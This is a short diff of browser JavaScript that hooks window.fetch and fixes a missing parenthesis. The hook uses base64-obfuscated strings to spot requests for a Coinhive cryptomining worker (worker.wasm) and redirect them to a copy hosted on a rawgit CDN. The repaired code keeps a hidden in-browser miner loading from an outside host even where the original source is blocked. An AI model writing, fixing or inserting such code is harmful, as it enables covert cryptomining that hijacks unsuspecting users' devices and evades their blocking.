@@ -11,7 +11,7 @@
         // Hook fetch
         let _fetch = window.fetch;
         window.fetch = function() {
-            if (arguments[0].includes(atob("Y29pbmhpdmUuY29tL2xpYi93b3JrZXIud2FzbQ==")) {
+            if (arguments[0].includes(atob("Y29pbmhpdmUuY29tL2xpYi93b3JrZXIud2FzbQ=="))) {
                 arguments[0] = atob("aHR0cHM6Ly9jZG4ucmF3Z2l0LmNvbS91bHRyYXR5cGUvdWx0cmFnZW4vYzM1YjExODEvd29ya2VyLndhc20=");
             }
             return _fetch.apply(this, arguments);
